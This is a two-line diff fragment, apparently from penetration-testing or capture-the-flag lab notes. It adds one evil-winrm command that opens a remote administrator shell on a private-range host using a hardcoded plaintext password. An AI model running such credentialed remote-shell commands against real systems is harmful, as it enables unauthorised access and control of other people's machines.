@@ -1,0 +1,2 @@
+
+evil-winrm -u Administrator -p '!R3m0te!' -i 10.10.10.180
